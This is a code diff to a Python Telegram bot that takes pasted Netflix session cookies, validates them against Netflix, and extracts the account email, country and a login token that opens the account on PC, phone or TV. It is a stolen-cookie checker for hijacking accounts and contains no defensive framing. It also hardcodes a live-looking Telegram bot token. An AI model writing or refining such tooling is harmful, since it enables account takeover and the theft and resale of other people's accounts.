@@ -11,38 +11,38 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ================== ORIGINAL CODE HELPERS ==================
-UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-
-def _djs(s):
-    if not s: return ""
-    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
-    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
-    return s.strip()
-
-def _rx(pattern, text, default=""):
-    m = re.search(pattern, text, re.S)
-    return m.group(1) if m else default
-
+# ================== STRONG COOKIE PARSER ==================
 def load_cookies(text):
     text = text.strip()
     cookies = {}
-    # Strong extraction for your long paste
-    match = re.search(r'NetflixId=([^;,\s"]+)', text)
-    if match:
-        cookies["NetflixId"] = match.group(1)
-    match = re.search(r'SecureNetflixId=([^;,\s"]+)', text)
+
+    # Very aggressive NetflixId extraction
+    patterns = [
+        r'NetflixId=([^;,\s"]+)',
+        r'"name":"NetflixId","value":"([^"]+)"',
+        r'NetflixId["\']?\s*[:=]\s*["\']?([^"\']+)',
+    ]
+
+    for pattern in patterns:
+        match = re.search(pattern, text, re.IGNORECASE)
+        if match:
+            cookies["NetflixId"] = match.group(1)
+            break
+
+    # SecureNetflixId
+    match = re.search(r'SecureNetflixId=([^;,\s"]+)', text, re.IGNORECASE)
     if match:
         cookies["SecureNetflixId"] = match.group(1)
+
     return cookies
 
-# ================== FULL CHECK FUNCTION ==================
+# ================== CHECKER ==================
 def check_account(cookies):
     if not cookies.get("NetflixId"):
         return None
 
     sess = requests.Session()
-    sess.headers.update({"User-Agent": UA_WEB})
+    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
     for k, v in cookies.items():
         sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
 
@@ -59,20 +59,15 @@ def check_account(cookies):
         return None
 
     email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
-    name = _djs(_rx(r'"firstName":"([^"]+)"', html)) or _djs(_rx(r'"name":"([^"]+)"', html))
+    name = _djs(_rx(r'"firstName":"([^"]+)"', html)) or "User"
     cc = _rx(r'"countryOfSignup":"([A-Z]{2})"', html, "US")
 
-    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
-    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
-
-    # Generate NFT Token
-    netflix_id = cookies.get("NetflixId")
+    # NFT Token
     tok = None
     try:
-        headers = {"User-Agent": UA_WEB, "Cookie": f"NetflixId={netflix_id}"}
-        r2 = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48", params={"responseFormat": "json"}, headers=headers, timeout=15, verify=False)
+        headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", "Cookie": f"NetflixId={cookies['NetflixId']}"}
+        r2 = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48", 
+                         params={"responseFormat": "json"}, headers=headers, timeout=15, verify=False)
         if r2.status_code == 200:
             data = r2.json()
             tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
@@ -86,34 +81,40 @@ def check_account(cookies):
         login_pc = login_phone = "N/A"
 
     return {
-        "name": name or "N/A",
+        "name": name,
         "email": email or "N/A",
         "country": cc,
-        "plan": plan or "Premium",
-        "price": price or "N/A",
-        "member_since": since or "N/A",
-        "next_billing": nextbill or "N/A",
         "login_pc": login_pc,
         "login_phone": login_phone,
         "login_tv": "https://www.netflix.com/tv2"
     }
+
+def _djs(s):
+    if not s: return ""
+    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
+    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
+    return s.strip()
+
+def _rx(pattern, text, default=""):
+    m = re.search(pattern, text, re.S)
+    return m.group(1) if m else default
 
 # ================== BOT ==================
 @bot.message_handler(commands=['start'])
 def start(message):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("🔍 Check Cookie")
-    bot.send_message(message.chat.id, "👋 Paste your Netflix cookie below", parse_mode="HTML", reply_markup=markup)
+    bot.send_message(message.chat.id, "👋 Paste your Netflix cookie", parse_mode="HTML", reply_markup=markup)
 
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
     if message.text == "🔍 Check Cookie":
-        bot.send_message(message.chat.id, "📤 Paste cookie now:")
+        bot.send_message(message.chat.id, "📤 Paste cookie:")
         return
 
     cookies = load_cookies(message.text)
     if not cookies.get("NetflixId"):
-        bot.reply_to(message, "❌ NetflixId not found.")
+        bot.reply_to(message, "❌ NetflixId not found. Try again.")
         return
 
     process_cookie(message, cookies)
@@ -123,7 +124,7 @@ def process_cookie(message, cookies):
     result = check_account(cookies)
 
     if not result:
-        bot.reply_to(message, "❌ Invalid cookie.")
+        bot.reply_to(message, "❌ Invalid or expired cookie.")
         return
 
     text = f"""
@@ -133,10 +134,7 @@ def process_cookie(message, cookies):
 📧 <code>{result['email']}</code>
 🌍 United States ({result['country']})
 
-📋 Plan: <b>{result['plan']}</b>
-💰 Price: {result['price']}
-📅 Since: {result['member_since']}
-🗓 Next Billing: {result['next_billing']}
+🔑 <b>NFT Token Login</b>
     """
 
     markup = types.InlineKeyboardMarkup()
@@ -146,5 +144,5 @@ def process_cookie(message, cookies):
 
     bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)
 
-print("🚀 Bot Started...")
+print("🚀 Bot is Running...")
 bot.infinity_polling()
